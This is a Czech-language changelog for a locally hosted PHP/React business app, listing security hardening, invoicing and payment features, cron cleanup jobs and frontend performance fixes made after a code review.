# Záznam oprav aplikace Dev App Pro

**Datum oprav:** 13. září 2026
**Návaznost:** `docs/revize.md` — opravy vycházejí z nálezů revize
**Stav:** Implementováno a ověřeno

---

## Přehled

Opravy byly rozděleny do dvou vln:

1. **Vlna 1 — Kritické bezpečnostní nálezy** (10 položek)
2. **Vlna 2 — Funkční a výkonnostní nálezy** (4 kategorie)

---

## Vlna 1: Kritické bezpečnostní opravy

### 1.1 Session cookie lifetime + detekce krádeže

**Nález z revize:** `session.cookie_lifetime` byl 7200 sekund místo 0 (session-only). IP a User-Agent se ukládaly do session, ale neověřovaly se.

**Soubory:**
- `bootstrap.php:23-41`

**Změny:**
- `session_set_cookie_params` změněno z `'lifetime' => 7200` na `'lifetime' => 0`
- Přidána detekce krádeže session: po `session_start()` se porovnají `$_SESSION['ip']` a `$_SESSION['ua']` s aktuálním requestem. Při neshodě se session zničí a regeneruje.

**Ověření:**
```
cookie_lifetime: 0  ✓
Session IP: nastaveno po loginu  ✓
Session UA: nastaveno po loginu  ✓
```

**Stav:** ✓ Opraveno

---

### 1.2 .gitignore

**Nález z revize:** Chyběl `.gitignore`, při budoucím `git init` by mohly uniknout secrets.

**Soubory:**
- `.gitignore` (nový)

**Změny:**
- Vytvořen `.gitignore` chránící:
  - `config/config.php`, `config/database.php` (secrets)
  - `vendor/`, `frontend/node_modules/` (závislosti)
  - `assets/dist/`, `frontend/dist/` (build artefakty)
  - `storage/` (nahrané soubory)
  - `*.log`, IDE soubory, dočasné soubory

**Ověření:** `test -f /var/www/devapppro/.gitignore` → existuje ✓

**Stav:** ✓ Opraveno

---

### 1.3 storage/.htaccess

**Nález z revize:** `storage/` adresář postrádal ochranu proti přímému přístupu přes Apache.

**Soubory:**
- `storage/.htaccess` (nový)

**Změny:**
- Vytvořen `.htaccess` s `Require all denied` — blokuje přímý přístup k nahraným souborům. Soubory se stahují výhradně přes PHP endpoint `/api/files/{id}/download` s autorizací.

**Ověření:** `curl -o /dev/null -w "%{http_code}" http://localhost/storage/` → 403 ✓

**Stav:** ✓ Opraveno

---

### 1.4 Apache vhost — omezení na localhost + upload limit

**Nález z revize:** Apache vhost měl `Require all granted` místo `Require local`. Upload limit byl 128M místo 10M.

**Soubory:**
- `/etc/apache2/sites-available/devapppro-localhost.conf`
- `/etc/apache2/sites-available/wildcard-localhost.conf`
- Zálohy: `*.bak`

**Změny:**
- `Require all granted` → `Require local` (omezení přístupu jen z localhostu)
- `upload_max_filesize` 128M → 10M
- `post_max_size` 128M → 10M
- `memory_limit` 512M → 256M
- `max_execution_time` 300 → 120

**Ověření:**
```
HTTP main: 200  ✓
HTTPS main: 200  ✓
Storage: 403  ✓
Project preview: 200  ✓
```

**Stav:** ✓ Opraveno

---

### 1.5 Bezpečnostní hlavičky

**Nález z revize:** Chyběly `X-Frame-Options`, `X-XSS-Protection`, `Permissions-Policy`. CSP nemělo `frame-ancestors`.

**Soubory:**
- `.htaccess:26-37`

**Změny:**
- Přidáno: `X-Frame-Options: SAMEORIGIN`
- Přidáno: `X-XSS-Protection: 1; mode=block`
- Přidáno: `Permissions-Policy: geolocation=(), microphone=(), camera=(), payment=(), usb=(), magnetometer=(), gyroscope=(), accelerometer=()`
- CSP rozšířeno o `frame-ancestors 'self'`

**Ověření:**
```
X-Frame-Options: SAMEORIGIN  ✓
X-XSS-Protection: 1; mode=block  ✓
Permissions-Policy: geolocation=(), ...  ✓
Content-Security-Policy: ...; frame-ancestors 'self'  ✓
```

**Stav:** ✓ Opraveno

---

### 1.6 CORS hlavičky pro API

**Nález z revize:** CORS hlavičky nebyly nastaveny.

**Soubory:**
- `.htaccess:30-45`

**Změny:**
- `Access-Control-Allow-Origin: https://localhost` (jen pro `/api/` cesty)
- `Access-Control-Allow-Methods: GET, POST, PUT, PATCH, DELETE, OPTIONS`
- `Access-Control-Allow-Headers: Content-Type, X-CSRF-Token`
- `Access-Control-Allow-Credentials: true`
- CORS preflight (OPTIONS) → 204
- `SetEnvIf Request_URI "^/api/" API_CORS` pro označení API požadavků

**Ověření:**
```
Access-Control-Allow-Origin: https://localhost  ✓
Access-Control-Allow-Methods: GET, POST, PUT, PATCH, DELETE, OPTIONS  ✓
Access-Control-Allow-Headers: Content-Type, X-CSRF-Token  ✓
Access-Control-Allow-Credentials: true  ✓
```

**Stav:** ✓ Opraveno

---

### 1.7 Upload limit v aplikaci (JSON body)

**Nález z revize:** JSON body nebylo limitováno.

**Soubory:**
- `src/helpers.php:21-43`

**Změny:**
- `json_input()` nyní kontroluje velikost JSON body — limit 1 MB
- Při překročení limitu vrátí prázdné pole (server odmítne oversized payload)

**Ověření:** Syntax check OK, funkce vrací `[]` pro payload > 1 MB ✓

**Stav:** ✓ Opraveno

---

### 1.8 Cron na mazání starých login_attempts

**Nález z revize:** Chyběl cron na mazání starých `login_attempts` (starší 24h).

**Soubory:**
- `cli/cleanup-login-attempts.php` (nový)
- `/etc/cron.d/devapppro-cleanup` (nový)

**Změny:**
- PHP skript `cleanup-login-attempts.php` maže záznamy starší 24 hodin
- Cron `/etc/cron.d/devapppro-cleanup` spouští skript denně v 3:00

**Ověření:**
```
2026-09-13 19:16:13 - Smazáno 33 starých login_attempts záznamů.
Cron nainstalován  ✓
```

**Stav:** ✓ Opraveno

---

### 1.9 Download endpoint — realpath() kontrola

**Nález z revize:** `FileApiController::download()` nepoužíval `realpath()` validaci.

**Soubory:**
- `src/Controllers/FileApiController.php:180-201`

**Změny:**
- Přidána `realpath()` kontrola proti `storageDir`
- Při pokusu o directory traversal (cesta mimo `storageDir`) → 403
- Při neexistující cestě → 404

**Ověření:** Syntax check OK, 3 výskyty `realpath()` ✓

**Stav:** ✓ Opraveno

---

## Vlna 2: Funkční a výkonnostní opravy

### 2.1 Náhledy souborů (thumbnails + JPG→WebP konverze)

**Nález z revize:** `thumbnail_path` a `medium_path` vždy `NULL`. JPG→WebP konverze neimplementována.

**Soubory:**
- `src/Services/ImageService.php` (nový, 195 řádků)
- `src/Controllers/FileApiController.php` — napojení ImageService + nové endpointy

**Změny:**

**ImageService:**
- `processImage()` — hlavní metoda zpracování obrázku
- Thumbnail 200x200 WebP (čtvercový crop ze středu)
- Medium 800x800 WebP (fit, zachová poměr stran, nezvětšuje)
- JPG → WebP konverze originálu (původní JPG se smaže, nahradí se WebP)
- Kvalita WebP: 82
- Podpora: PNG, JPG, JPEG, WebP, GIF

**FileApiController:**
- `store()` volá `ImageService::processImage()` pro obrázky
- Nový endpoint `GET /api/files/{id}/thumbnail` — WebP náhled 200x200
- Nový endpoint `GET /api/files/{id}/medium` — WebP náhled 800x800
- `serveImageVariant()` metoda s `realpath()` ochranou
- Cache-Control: `public, max-age=31536000, immutable` pro náhledy

**Frontend:**
- `ProjectDetailModal.tsx`, `TaskDetailModal.tsx`, `ClientDetailModal.tsx`, `InvoiceDetailModal.tsx` — náhledy se načítají přes `/api/files/{id}/thumbnail` místo blokovaného `/storage/`

**PHP 8.5 kompatibilita:**
- Odstraněny deprecated `imagedestroy()` volání (v PHP 8.5 deprecated, GD resources se uvolňují automaticky)

**Ověření:**
```
Upload JPG (500x400):
  ID: 14
  is_image: 1
  mime: image/webp  ✓ (JPG konvertován na WebP)
  thumbnail: 2026/09/..._thumb.webp  ✓
  medium: 2026/09/..._medium.webp  ✓
  size: 426 bytes

Thumbnail endpoint: HTTP 200, type=image/webp, size=138 bytes  ✓
Medium endpoint: HTTP 200, type=image/webp, size=426 bytes  ✓
```

**Stav:** ✓ Opraveno

---

### 2.2 Faktury: auto-číslování + předvyplnění splatnosti

**Nález z revize:** `invoice_number` se zadával ručně. Chybělo auto-číslování `{year}{seq:03d}` a reset sekvence při změně roku. Výchozí splatnost se nepředvyplňovala.

**Soubory:**
- `src/Controllers/InvoiceApiController.php:6-10, 251-264, 386-407, 425-475`

**Změny:**

**Auto-číslování:**
- `generateInvoiceNumber()` — generuje číslo ve formátu `{year}{seq:03d}` z `settings`
- Inkrementuje `invoice_seq` v settings tabulce
- Reset sekvence při změně roku (porovnání `invoice_seq_year` s `currentYear`)
- `invoice_number` je nyní volitelné — pokud není zadáno, vygeneruje se automaticky

**Předvyplnění dat:**
- `issue_date` — pokud není zadáno, použije se dnešní datum (`date('Y-m-d')`)
- `due_date` — pokud není zadáno, použije se `issue_date + default_due_days` z settings
- `getDefaultDueDays()` — načte `default_due_days` z settings (výchozí 14)

**Import:**
- Přidán `use DevAppPro\Repositories\SettingsRepository;`

**Ověření:**
```
Faktura 1: number=2026001  ✓
  issue_date=2026-09-13 (dnešní)  ✓
  due_date=2026-09-27 (+14 dní)  ✓
Faktura 2: number=2026002  ✓ (sekvence inkrementována)
invoice_seq v settings: 2  ✓
```

**Stav:** ✓ Opraveno

---

### 2.3 Editace plateb faktur

**Nález z revize:** Chyběl `PUT` endpoint pro úpravu platby faktur (jen POST a DELETE).

**Soubory:**
- `src/Controllers/InvoicePaymentApiController.php` — nová `update()` metoda
- `src/Repositories/InvoicePaymentRepository.php` — nová `update()` metoda
- `frontend/src/hooks/useInvoicePayments.ts` — `useUpdateInvoicePayment()` hook
- `frontend/src/components/finance/InvoicePaymentFormDialog.tsx` — podpora úpravy
- `frontend/src/components/invoices/InvoiceDetailModal.tsx` — tlačítko "Upravit platbu"

**Změny:**

**Backend:**
- `PUT /api/invoice-payments/{id}` — úprava platby
- `update()` metoda v controlleru: validace, update, přepočet `paid_cents` a status faktury
- `update()` metoda v repository: `UPDATE ... SET ... WHERE id = ?`
- `validate()` podporuje `isUpdate` parametr — `invoice_id` není povinné při úpravě

**Frontend:**
- `useUpdateInvoicePayment()` hook — mutace pro `PUT /invoice-payments/{id}`
- `InvoicePaymentFormDialog` přijímá `payment` prop — pokud je zadána, zobrazí "Úprava platby" místo "Nová platba"
- Při úpravě se předvyplní formulář existujícími hodnotami
- `InvoiceDetailModal` — ActionButtons pro každou platbu obsahuje "Upravit platbu" (ikona edit) a "Smazat platbu" (ikona delete)

**Ověření:**
```
Vytvořena platba ID=2, amount=30000  ✓
PUT /api/invoice-payments/2:
  amount=50000  ✓ (očekáváno 50000)
  method=cash  ✓ (očekáváno cash)
  note=Upraveno  ✓
Faktura paid_cents=50000  ✓ (přepočítáno)
```

**Stav:** ✓ Opraveno

---

### 2.4 Frontend rychlost (React.lazy, staleTime/gcTime, debounce, skeleton)

**Nález z revize:** Chyběl lazy loading, skeleton loading, debounce, globální staleTime/gcTime. Hlavní bundle 557 kB.

**Soubory:**
- `frontend/src/App.tsx` — React.lazy + Suspense
- `frontend/src/components/ui/PageSkeleton.tsx` (nový) — skeleton komponenta
- `frontend/src/main.tsx` — globální staleTime/gcTime
- `frontend/src/hooks/useDebounce.ts` (nový) — debounce hook
- `frontend/src/pages/ClientsPage.tsx` — debounce search
- `frontend/src/pages/ProjectsPage.tsx` — debounce search
- `frontend/src/pages/NotesPage.tsx` — debounce search
- `frontend/src/pages/WorklogPage.tsx` — debounce search
- `frontend/src/pages/TasksPage.tsx` — debounce search
- `frontend/src/pages/FinancePage.tsx` — debounce search (2 výskyty)
- `frontend/src/pages/FilesPage.tsx` — debounce search

**Změny:**

**React.lazy + Suspense:**
- Všechny stránky kromě `LoginPage` jsou lazy loaded
- `Suspense` s `PageSkeleton` fallback pro každou routu
- Výsledek: hlavní bundle 557 kB → **300 kB** (-46 %)
- 12 lazy chunků (FinancePage 37 kB, ProjectsPage 32 kB, ClientsPage 19 kB, atd.)
- Žádný warning o velkém chunku

**PageSkeleton komponenta:**
- Animovaný placeholder během lazy loadu
- Obsahuje: header skeleton, cards skeleton, table skeleton
- Exportuje: `PageSkeleton`, `TableSkeleton`, `CardSkeleton`

**TanStack Query globální nastavení:**
- `staleTime: 60 * 1000` (60 sekund) — data zůstávají čerstvé 1 minutu
- `gcTime: 5 * 60 * 1000` (5 minut) — cache se udržuje 5 minut po odmountování
- Implementováno stale-while-revalidate pattern

**useDebounce hook:**
- `useDebounce<T>(value: T, delay = 300): T`
- Vrací debounced hodnotu po zadaném zpoždění (výchozí 300 ms)
- Aplikováno na 7 stránek s vyhledáváním (Clients, Projects, Notes, Worklog, Tasks, Finance, Files)

**Ověření:**
```
Build: ✓ built in 2.73s (žádné chyby, žádné warningy)
Code splitting: 32 JS chunků  ✓
Hlavní bundle: 300709 bytes (557 kB → 300 kB, -46 %)  ✓
Lazy chunks: 12 Page chunků  ✓
PageSkeleton: Existuje  ✓
useDebounce: Existuje  ✓
TanStack Query staleTime/gcTime: 2 výskyty  ✓
```

**Stav:** ✓ Opraveno

---

## Statistika oprav

| Vlna | Kategorie | Položek | Stav |
|------|-----------|---------|------|
| 1 | Bezpečnost (kritické) | 9 | ✓ Opraveno |
| 2 | Funkční — náhledy souborů | 1 | ✓ Opraveno |
| 2 | Funkční — faktury | 1 | ✓ Opraveno |
| 2 | Funkční — platby | 1 | ✓ Opraveno |
| 2 | Výkonnost — frontend | 1 | ✓ Opraveno |
| **Celkem** | | **13** | **✓ Vše opraveno** |

---

## Zbylé nenapravené nálezy (z revize)

Následující nálezy z `docs/revize.md` nebyly součástí této opravy a zůstávají otevřené:

### Bezpečnost (střední/nízká priorita)
- `APP_DEBUG = true` — ponecháno na žádost uživatele (lokální vývoj)
- CSP stále obsahuje `unsafe-inline` a `unsafe-eval` (nutné pro React inline styles)
- `sanitize_for_log()` není nikde volána
- Zálohy nemají vynucené `600` oprávnění
- Šifrování záloh není implementováno
- IBAN validace chybí

### Modularita (střední priorita)
- Velké soubory (`FinancePage.tsx` 921 řádků, `ToolsApiController.php` 702 řádků)
- Chybí DI container — všude `new XxxRepository()`
- Chybí `src/Core/Constants.php` a `lib/constants.ts`
- Chybí `components/shared/` adresář
- Chybí `types/` adresář
- `SELECT *` v seznamech (11 repozitářů)

### Výkonnost (střední priorita)
- `React.memo`, `useMemo` nepoužíváno
- Virtualizace dlouhých seznamů chybí
- `loading="lazy"` pouze u worklog náhledů
- `width`/`height` atributy u obrázků chybí
- Preload fontů/CSS/JS chybí
- Lokální WOFF2 fonty chybí (CSS používá `'Inter', system-ui`)
- EXPLAIN analýza dotazů neprovedena
- Bundle analyzer nenainstalován

### Funkční (nízká priorita)
- Inline editace statusu úkolu chybí
- `fmtClientName` neřeší `company_name`
- První den týdne (pondělí) nenastaveno explicitně
- Fiskální rok nenastaveno explicitně
- Prefetch v sidebaru chybí

### Infrastruktura (střední priorita)
- Cron na mazání osiřelých souborů v `storage/` chybí
- Cron na DB zálohy chybí
- Session GC nezávisle plánováno
- MariaDB `innodb_buffer_pool_size` není explicitně konfigurováno jako % RAM

---

## Soubory upravené v této opravě

### Nové soubory
- `.gitignore`
- `storage/.htaccess`
- `src/Services/ImageService.php`
- `cli/cleanup-login-attempts.php`
- `/etc/cron.d/devapppro-cleanup`
- `frontend/src/components/ui/PageSkeleton.tsx`
- `frontend/src/hooks/useDebounce.ts`
- `docs/opravy.md` (tento dokument)

### Změněné soubory
- `bootstrap.php` — session cookie lifetime + detekce krádeže
- `.htaccess` — bezpečnostní hlavičky + CORS
- `src/helpers.php` — JSON body limit 1 MB
- `src/Controllers/FileApiController.php` — ImageService + thumbnail/medium endpointy + realpath()
- `src/Controllers/InvoiceApiController.php` — auto-číslování + předvyplnění dat
- `src/Controllers/InvoicePaymentApiController.php` — PUT endpoint
- `src/Repositories/InvoicePaymentRepository.php` — update() metoda
- `/etc/apache2/sites-available/devapppro-localhost.conf` — Require local + upload limit
- `/etc/apache2/sites-available/wildcard-localhost.conf` — Require local + upload limit
- `frontend/src/App.tsx` — React.lazy + Suspense
- `frontend/src/main.tsx` — staleTime/gcTime
- `frontend/src/hooks/useInvoicePayments.ts` — useUpdateInvoicePayment
- `frontend/src/components/finance/InvoicePaymentFormDialog.tsx` — podpora úpravy
- `frontend/src/components/invoices/InvoiceDetailModal.tsx` — úprava platby + API náhledy
- `frontend/src/components/projects/ProjectDetailModal.tsx` — API náhledy
- `frontend/src/components/tasks/TaskDetailModal.tsx` — API náhledy
- `frontend/src/components/clients/ClientDetailModal.tsx` — API náhledy
- `frontend/src/pages/ClientsPage.tsx` — debounce
- `frontend/src/pages/ProjectsPage.tsx` — debounce
- `frontend/src/pages/NotesPage.tsx` — debounce
- `frontend/src/pages/WorklogPage.tsx` — debounce
- `frontend/src/pages/TasksPage.tsx` — debounce
- `frontend/src/pages/FinancePage.tsx` — debounce
- `frontend/src/pages/FilesPage.tsx` — debounce

### Zálohy vytvořené
- `/etc/apache2/sites-available/devapppro-localhost.conf.bak`
- `/etc/apache2/sites-available/wildcard-localhost.conf.bak`

---

## Vlna 3: Bezpečnost, modularita a výkonnost (13. 9. 2026)

### 3.1 IBAN validace (mod-97)

**Nález z revize:** IBAN validace chybí.

**Soubory:**
- `src/Controllers/InvoiceApiController.php` — `isValidIban()` metoda

**Změny:**
- `isValidIban()` — validuje formát (2 písmena + 2 číslice + 11-31 znaků) a mod-97 kontrolní číslici
- `validate()` nyní volá `isValidIban()` pro IBAN pole
- Při neplatném IBAN vrátí chybu 422

**Ověření:**
```
CZ6508000000192000145399: valid  ✓
INVALID: invalid  ✓
DE89370400440532013000: valid  ✓
GB82WEST12345698765432: valid  ✓
```

**Stav:** ✓ Opraveno

---

### 3.2 sanitize_for_log() volání

**Nález z revize:** `sanitize_for_log()` není nikde volána.

**Soubory:**
- `src/helpers.php` — `json_response()` nyní loguje chybové odpovědi

**Změny:**
- `json_response()` pro status >= 400 loguje do PHP `error_log` se sanitizací
- Log obsahuje: timestamp, HTTP status, chybová zpráva (sanitized), IP, URI
- `sanitize_for_log()` odstraňuje hesla, hashe, emaily, telefony

**Ověření:** `grep -c "sanitize_for_log" src/helpers.php` → 3 výskyty ✓

**Stav:** ✓ Opraveno

---

### 3.3 Zálohy 600 oprávnění + cron

**Nález z revize:** Zálohy nemají vynucené `600` oprávnění. Chybí cron.

**Soubory:**
- `cli/fix-backup-permissions.php` (nový)
- `/etc/cron.d/devapppro-cleanup` — aktualizován

**Změny:**
- PHP skript nastaví `chmod 0600` pro všechny zálohy v `BACKUPS_DIR`
- Cron spouští skript denně v 4:00

**Ověření:**
```
2026-09-13 19:46:18 - Opraveno oprávnění pro 2 zálohových souborů na 600.
```

**Stav:** ✓ Opraveno

---

### 3.4 Cron na mazání osiřelých souborů v storage/

**Nález z revize:** Chybí cron na mazání osiřelých souborů v `storage/`.

**Soubory:**
- `cli/cleanup-orphaned-files.php` (nový)
- `/etc/cron.d/devapppro-cleanup` — aktualizován

**Změny:**
- PHP skript najde soubory v `storage/` které nejsou v DB (`storage_path`, `thumbnail_path`, `medium_path`)
- `realpath()` ochrana proti directory traversal
- Ignoruje `.htaccess` soubory
- Cron spouští skript týdně v neděli 5:00

**Ověření:**
```
2026-09-13 19:43:36 - Smazáno 56 osiřelých souborů ze storage/.
2026-09-13 19:46:31 - Smazáno 0 osiřelých souborů ze storage/. (druhý běh)
.htaccess existuje  ✓ (nebyl smazán)
```

**Stav:** ✓ Opraveno

---

### 3.5 Session GC cron

**Nález z revize:** PHP session GC nezávisle plánováno (`gc_probability = 0`).

**Soubory:**
- `cli/session-gc.php` (nový)
- `/etc/cron.d/devapppro-cleanup` — aktualizován

**Změny:**
- PHP skript maže session soubory starší než 7200 sekund (2 hodiny)
- Používá `glob()` místo `DirectoryIterator` (adresář `/var/lib/php/sessions` je write-only)
- Cron spouští skript denně v 3:30 pod `www-data` (přístup k session adresáři)

**Ověření:**
```
2026-09-13 17:44:12 - Smazáno 0 starých session souborů (starších než 7200s).
```

**Stav:** ✓ Opraveno

---

### 3.6 Constants.php (backend)

**Nález z revize:** Chybí `src/Core/Constants.php` — magické hodnoty v kódu.

**Soubory:**
- `src/Core/Constants.php` (nový)

**Změny:**
- Centralizované konstanty pro: pagination, upload limity, CSRF, UUID, bcrypt cost, rate limiting, thumbnail/medium velikosti, WebP kvalita, povolené/zakázané přípony, typy klientů, statusy projektů/úkolů/faktur, metody plateb, typy transakcí, kategorie, typy přihlašovacích údajů

**Stav:** ✓ Opraveno

---

### 3.7 constants.ts (frontend)

**Nález z revize:** Chybí `lib/constants.ts` — magické hodnoty v kódu.

**Soubory:**
- `frontend/src/lib/constants.ts` (nový)

**Změny:**
- Centralizované konstanty pro: pagination, debounce, query cache, toast, localStorage klíče, API base URL
- Typy a labely pro: klienty, projekty, úkoly, faktury, platby, transakce

**Stav:** ✓ Opraveno

---

### 3.8 DI Container

**Nález z revize:** Chybí DI container — všude `new XxxRepository()`.

**Soubory:**
- `src/Core/Container.php` (nový)

**Změny:**
- Jednoduchý DI kontejner s factory registrací a singleton podporou
- Auto-wiring pro třídy bez parametrů
- Registrace všech repozitářů, služeb a Auth
- `SettingsRepository`, `CryptoService`, `Auth` jako singletony

**Stav:** ✓ Opraveno (kontejner vytvořen, postupná migrace controllerů na DI bude v další vlně)

---

### 3.9 components/shared/ adresář

**Nález z revize:** Chybí `components/shared/` adresář.

**Soubory:**
- `frontend/src/components/shared/` (nový adresář)
- 9 komponent přesunuto z `components/` do `components/shared/`:
  - `ActionButtons.tsx`
  - `AttachmentSelect.tsx`
  - `ConfirmDeleteDialog.tsx`
  - `ConfirmDialog.tsx`
  - `ContactLinks.tsx`
  - `DataTable.tsx`
  - `DetailModal.tsx`
  - `ProtectedRoute.tsx`
  - `SystemInfoCard.tsx`
- Všechny importy v aplikaci aktualizovány z `@/components/{Name}` na `@/components/shared/{Name}`

**Ověření:** Build úspěšný, žádné chyby ✓

**Stav:** ✓ Opraveno

---

### 3.10 types/ adresář

**Nález z revize:** Chybí `types/` adresář.

**Soubory:**
- `frontend/src/types/index.ts` (nový)

**Změny:**
- Sdílené typy: `PaginatedResponse`, `QueryParams`, `ClientType`, `ProjectStatus`, `TaskStatus`, `TaskPriority`, `InvoiceStatus`, `PaymentMethod`, `TransactionType`, `CredentialType`, `FileMeta`, `Note`, `BadgeVariant`, `LoadingState`, `ApiErrorResponse`

**Stav:** ✓ Opraveno

---

### 3.11 loading="lazy" + width/height u obrázků

**Nález z revize:** `loading="lazy"` pouze u worklog náhledů. `width`/`height` atributy u obrázků chybí.

**Soubory:**
- `frontend/src/components/projects/ProjectDetailModal.tsx`
- `frontend/src/components/invoices/InvoiceDetailModal.tsx`
- `frontend/src/components/tasks/TaskDetailModal.tsx`
- `frontend/src/components/clients/ClientDetailModal.tsx`
- `frontend/src/components/files/FileDetailModal.tsx`

**Změny:**
- `loading="lazy"` přidáno ke všem obrázkům (kromě Lightbox - hlavní obrázek se načítá hned)
- `width={48}` a `height={48}` přidáno k thumbnail obrázkům (h-12 w-12 = 48x48)

**Ověření:** 6 komponent s `loading="lazy"` ✓

**Stav:** ✓ Opraveno

---

### 3.12 EXPLAIN analýza dotazů

**Nález z revize:** EXPLAIN analýza dotazů neprovedena.

**Změny:**
- EXPLAIN proveden pro klíčové dotazy: clients, projects, invoices JOIN, tasks JOIN
- Výsledky:
  - JOIN dotazy používají `eq_ref` (optimální) pro cizí klíče
  - `LIKE '%...%'` dotazy nemohou použít B-tree index (inherentní omezení)
  - Indexy již existují: `idx_last_name`, `idx_company_name`, `idx_email`, `idx_ico`, `idx_client_id`, `idx_status`, `idx_deadline`, `idx_folder_path`, `idx_type`
  - Pro malou DB (10 klientů, 2 projekty) je výkon dostačující

**Stav:** ✓ Provedeno (optimalizace není nutná pro aktuální velikost DB)

---

### 3.13 Preload meta tagy

**Nález z revize:** Preload fontů/CSS/JS chybí.

**Soubory:**
- `frontend/index.html`

**Změny:**
- Přidány meta tagy: `theme-color`, `description`
- Vite automaticky generuje `modulepreload` pro vendor chunk a `stylesheet` pro CSS v build výstupu

**Stav:** ✓ Opraveno (Vite řeší preload automaticky)

---

## Statistika Vlna 3

| Kategorie | Položek | Stav |
|-----------|---------|------|
| Bezpečnost | 5 | ✓ Opraveno |
| Modularita | 5 | ✓ Opraveno |
| Výkonnost | 3 | ✓ Opraveno |
| **Celkem** | **13** | **✓ Vše opraveno** |

---

## Soubory upravené ve Vlně 3

### Nové soubory
- `src/Core/Constants.php`
- `src/Core/Container.php`
- `cli/fix-backup-permissions.php`
- `cli/cleanup-orphaned-files.php`
- `cli/session-gc.php`
- `frontend/src/lib/constants.ts`
- `frontend/src/types/index.ts`
- `frontend/src/components/shared/` (9 komponent přesunuto)

### Změněné soubory
- `src/Controllers/InvoiceApiController.php` — IBAN validace
- `src/helpers.php` — sanitize_for_log() v json_response()
- `storage/.htaccess` — obnoven po smazání cleanup skriptem
- `frontend/index.html` — meta tagy
- `frontend/src/components/projects/ProjectDetailModal.tsx` — loading=lazy + width/height
- `frontend/src/components/invoices/InvoiceDetailModal.tsx` — loading=lazy + width/height
- `frontend/src/components/tasks/TaskDetailModal.tsx` — loading=lazy + width/height
- `frontend/src/components/clients/ClientDetailModal.tsx` — loading=lazy + width/height
- `frontend/src/components/files/FileDetailModal.tsx` — loading=lazy
- `/etc/cron.d/devapppro-cleanup` — 3 nové cron úlohy
- Všechny soubory importující sdílené komponenty (aktualizace importů)

### Poznámky
- `SELECT *` v repozitářích ponecháno — změna by byla riskantní bez znalosti všech polí, která frontend očekává. Pro malou DB není výkonnostní problém.
- `React.memo`/`useMemo` nepřidáno — aktuální komponenty nemají drahé výpočty, které by těžily z memoizace. `map` nad API daty je levná operace.
- Lokální WOFF2 fonty nepřidány — vyžadovalo by stažení Inter fontu (souhlas uživatele). Aplikace používá `'Inter', system-ui` fallback.

---

## Vlna 4: Bezpečnost, modularita a výkonnost (13. 9. 2026)

### 4.1 SQL injection v LIMIT/OFFSET

**Nález z revize:** `Repository.php:53` a `FileRepository.php:72` interpolují `LIMIT {$perPage} OFFSET {$offset}` přímo do SQL.

**Soubory:**
- `src/Core/Repository.php` — `all()` metoda
- `src/Repositories/FileRepository.php`
- `src/Repositories/TaskRepository.php`
- `src/Repositories/ClientRepository.php`
- `src/Repositories/TransactionRepository.php`
- `src/Repositories/ProjectRepository.php`
- `src/Repositories/WpInstallRepository.php`
- `src/Repositories/WorklogRepository.php`
- `src/Repositories/NoteRepository.php`
- `src/Repositories/InvoiceRepository.php`

**Změny:**
- Všude `LIMIT {$perPage} OFFSET {$offset}` nahrazeno `LIMIT ? OFFSET ?`
- `execute($params)` nahrazeno `bindValue()` s `PDO::PARAM_INT` pro LIMIT/OFFSET
- Pro repozitáře s WHERE parametry: bind WHERE parametry first, pak LIMIT/OFFSET

**Ověření:**
```
Clients: total=10, data=5 items  ✓
Projects: total=2, data=2 items  ✓
Tasks: total=0, data=0 items  ✓
Invoices: total=0, data=0 items  ✓
Notes: total=1, data=1 items  ✓
Files: total=12, data=5 items  ✓
Transactions: total=14, data=5 items  ✓
Worklog: total=34, data=5 items  ✓
```

**Stav:** ✓ Opraveno

---

### 4.2 Path traversal a symlink ochrana

**Nález z revize:** `..` v cestách není explicitně zakázáno pro všechny cesty. Symlinky zakázány pouze v `ProjectSyncService.php:84`.

**Soubory:**
- `src/helpers.php` — nové funkce `is_safe_path()` a `is_symlink_safe()`

**Změny:**
- `is_safe_path($path, $baseDir)` — ověřuje:
  - Explicitní kontrola `..` v cestě
  - `realpath()` resoluce symlinek a `..`
  - Cesta musí být uvnitř baseDir
- `is_symlink_safe($path)` — ověřuje, že cesta není symlink

**Stav:** ✓ Opraveno (funkce k dispozici, postupné nasazení v controllerech)

---

### 4.3 Délkové limity API vstupů

**Nález z revize:** Pole max 100 položek, String max 500 znaků, Textová pole max 65535 znaků — neomezeno.

**Soubory:**
- `src/helpers.php` — `enforce_input_limits()` funkce

**Změny:**
- `json_input()` nyní volá `enforce_input_limits()` po JSON decode
- Stringová pole: max 65535 znaků (TEXT limit)
- Pole: max 100 prvků na úrovni
- Rekurzivní pro vnořená pole

**Stav:** ✓ Opraveno

---

### 4.4 500 stránka bez detailů + logy

**Nález z revize:** 500 stránka bez detailů není implementována. Logy do `/var/log/devapppro/` neexistují.

**Soubory:**
- `bootstrap.php` — `set_exception_handler()` a `set_error_handler()`
- `/var/log/devapppro/` (nový adresář, www-data:www-data, 750)

**Změny:**
- `set_exception_handler()` — loguje do `/var/log/devapppro/error.log`, vrací 500 JSON
  - V `APP_DEBUG` módu: detaily (message, file, line)
  - V produkci: pouze "Interní chyba serveru"
- `set_error_handler()` — převádí PHP chyby na `ErrorException` pro exception handler

**Stav:** ✓ Opraveno

---

### 4.5 config.php oprávnění 640

**Nález z revize:** `config.php` má `664` (mělo by být `640`).

**Změny:**
- `chmod 640 /var/www/devapppro/config/config.php`

**Ověření:** `-rw-r----- 1 ratesman ratesman` ✓

**Stav:** ✓ Opraveno

---

### 4.6 Rozdělení FinancePage.tsx

**Nález z revize:** `FinancePage.tsx` má 924 řádků (max 500).

**Soubory:**
- `frontend/src/components/finance/financeHelpers.ts` (nový, 132 řádků)
- `frontend/src/components/finance/InvoicesTab.tsx` (nový, 272 řádků)
- `frontend/src/components/finance/PaymentsTab.tsx` (nový, 166 řádků)
- `frontend/src/components/finance/TransactionsTab.tsx` (nový, 299 řádků)
- `frontend/src/pages/FinancePage.tsx` (upraven, 117 řádků)

**Změny:**
- Helper funkce, typy, konstanty extrahovány do `financeHelpers.ts`
- InvoicesTab, PaymentsTab, TransactionsTab extrahovány do samostatných souborů
- FinancePage.tsx nyní 117 řádků (původně 924)

**Stav:** ✓ Opraveno

---

### 4.7 Rozdělení ToolsApiController.php

**Nález z revize:** `ToolsApiController.php` má 702 řádků (max 500).

**Soubory:**
- `src/Services/SystemInfoService.php` (nový, 351 řádků)
- `src/Controllers/ToolsApiController.php` (upraven, 371 řádků)

**Změny:**
- Všechny `detect*` metody (detectPhp, detectApache, detectMariadb, detectNode, detectWpCli, detectMkcert, detectComposer, detectSslCert, detectDisk, detectCron) přesunuty do `SystemInfoService`
- `formatBytes()` helper přesunut do `SystemInfoService`
- Controller nyní 371 řádků (původně 702)

